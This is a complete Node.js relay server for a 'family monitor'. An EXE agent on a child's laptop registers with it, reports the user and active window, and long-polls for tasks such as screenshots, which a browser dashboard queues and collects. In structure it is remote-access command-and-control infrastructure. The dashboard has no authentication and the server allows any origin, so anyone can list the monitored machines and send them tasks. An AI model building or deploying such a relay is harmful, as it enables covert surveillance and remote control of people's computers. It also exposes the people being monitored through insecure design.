// Family Monitor Relay Server
// Free deploy on Render.com as a Web Service
// node server.js

const http   = require('http');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;

// ── SESSION STORE ─────────────────────────────────────────────
// sessions[id] = {
//   info: { pc, user, home, win, mon },
//   lastSeen: ms,
//   taskQueue: [ {taskId, type, payload} ],
//   results:   { taskId: {data:Buffer, ct:string} },
//   waitDash:  { taskId: res },   // dashboard waiting for result
//   waitAgent: fn                 // agent waiting for task
// }
const sessions = {};

function getSession(id) {
    if (!sessions[id]) sessions[id] = {
        info: {}, lastSeen: 0,
        taskQueue: [], results: {},
        waitDash: {}, waitAgent: null
    };
    return sessions[id];
}

// Prune old sessions hourly
setInterval(() => {
    const cut = Date.now() - 86400000;
    for (const id in sessions)
        if (sessions[id].lastSeen < cut) delete sessions[id];
}, 3600000);

// ── HTTP HELPERS ──────────────────────────────────────────────
const CORS = {
    'Access-Control-Allow-Origin':  '*',
    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type,x-agent-id',
};

function body(req) {
    return new Promise(r => {
        const c = [];
        req.on('data', d => c.push(d));
        req.on('end',  () => r(Buffer.concat(c)));
    });
}

function json(res, code, obj) {
    const b = Buffer.from(JSON.stringify(obj));
    res.writeHead(code, { ...CORS, 'Content-Type': 'application/json', 'Content-Length': b.length });
    res.end(b);
}

function raw(res, buf, ct) {
    res.writeHead(200, { ...CORS, 'Content-Type': ct, 'Content-Length': buf.length });
    res.end(buf);
}

// ── ROUTING ───────────────────────────────────────────────────
http.createServer(async (req, res) => {
    const u    = new URL(req.url, 'http://x');
    const path = u.pathname;
    const qs   = u.searchParams;

    // Preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(204, CORS); res.end(); return;
    }

    // ── HEALTH CHECK ──────────────────────────────────────────
    if (path === '/') {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('Family Monitor Relay\n'); return;
    }

    // ════════════════════════════════════════════════════════
    // AGENT ROUTES  (called by EXE on kid's laptop)
    // ════════════════════════════════════════════════════════

    // POST /agent/hello
    // Body: { id, pc, user, home }
    if (path === '/agent/hello' && req.method === 'POST') {
        const b = JSON.parse((await body(req)).toString());
        const s = getSession(b.id);
        s.info     = { pc: b.pc, user: b.user, home: b.home, win: '', mon: true };
        s.lastSeen = Date.now();
        console.log('[+]', b.id, b.pc, b.user);
        return json(res, 200, { ok: true });
    }

    // GET /agent/poll?id=xxx
    // Agent hangs here waiting for a task (25s long-poll)
    if (path === '/agent/poll' && req.method === 'GET') {
        const id = qs.get('id');
        const s  = getSession(id);
        s.lastSeen = Date.now();
        s.info.online = true;

        // Task already queued?
        if (s.taskQueue.length > 0) {
            return json(res, 200, s.taskQueue.shift());
        }

        // Wait for a task
        let timer;
        s.waitAgent = (task) => {
            clearTimeout(timer);
            s.waitAgent = null;
            if (!res.headersSent) json(res, 200, task || { type: 'noop' });
        };
        timer = setTimeout(() => { if (s.waitAgent) s.waitAgent(null); }, 25000);
        req.on('close', () => { clearTimeout(timer); s.waitAgent = null; });
        return;
    }

    // POST /agent/result?id=xxx&taskId=xxx&ct=xxx
    // Agent returns result for a task
    if (path === '/agent/result' && req.method === 'POST') {
        const id     = qs.get('id');
        const taskId = qs.get('taskId');
        const ct     = qs.get('ct') || 'application/json';
        const buf    = await body(req);
        const s      = getSession(id);
        s.lastSeen   = Date.now();

        // Is dashboard waiting for this result?
        if (s.waitDash[taskId]) {
            const dashRes = s.waitDash[taskId];
            delete s.waitDash[taskId];
            if (!dashRes.headersSent) raw(dashRes, buf, ct);
        } else {
            // Cache it briefly
            s.results[taskId] = { data: buf, ct };
            setTimeout(() => delete s.results[taskId], 30000);
        }
        return json(res, 200, { ok: true });
    }

    // POST /agent/beat?id=xxx
    // Heartbeat with active window + monitor state
    if (path === '/agent/beat' && req.method === 'POST') {
        const id  = qs.get('id');
        const b2  = JSON.parse((await body(req)).toString());
        const s   = getSession(id);
        s.lastSeen       = Date.now();
        s.info.online    = true;
        s.info.win       = b2.win  || '';
        s.info.mon       = b2.mon  !== false;
        return json(res, 200, { ok: true });
    }

    // ════════════════════════════════════════════════════════
    // DASHBOARD ROUTES  (called by browser)
    // ════════════════════════════════════════════════════════

    // GET /dash/sessions
    // Returns list of all known agents
    if (path === '/dash/sessions') {
        const list = Object.entries(sessions).map(([id, s]) => ({
            id,
            pc:      s.info.pc    || id,
            user:    s.info.user  || '?',
            home:    s.info.home  || '',
            win:     s.info.win   || '',
            mon:     s.info.mon   !== false,
            online:  s.info.online && (Date.now() - s.lastSeen < 35000),
            seen:    s.lastSeen,
        }));
        return json(res, 200, list);
    }

    // POST /dash/task
    // Body: { id, type, payload }
    // Sends a task to the agent and waits for result (long-poll)
    if (path === '/dash/task' && req.method === 'POST') {
        const b3     = JSON.parse((await body(req)).toString());
        const id     = b3.id;
        const s      = sessions[id];
        if (!s) return json(res, 404, { error: 'agent not found' });

        const taskId  = crypto.randomBytes(8).toString('hex');
        const task    = { taskId, type: b3.type, payload: b3.payload || '' };
        const timeout = b3.type === 'screenshot' ? 15000 : 10000;

        // Deliver task to agent
        if (s.waitAgent) {
            const wa = s.waitAgent;
            s.waitAgent = null;
            wa(task);
        } else {
            s.taskQueue.push(task);
        }

        // Wait for result
        if (s.results[taskId]) {
            const r = s.results[taskId];
            delete s.results[taskId];
            return raw(res, r.data, r.ct);
        }

        s.waitDash[taskId] = res;
        const t = setTimeout(() => {
            delete s.waitDash[taskId];
            if (!res.headersSent) json(res, 504, { error: 'agent timeout - is the EXE running?' });
        }, timeout);
        req.on('close', () => { clearTimeout(t); delete s.waitDash[taskId]; });
        return;
    }

    json(res, 404, { error: 'not found' });

}).listen(PORT, '0.0.0.0', () => {
    console.log('Family Monitor Relay on port', PORT);
});
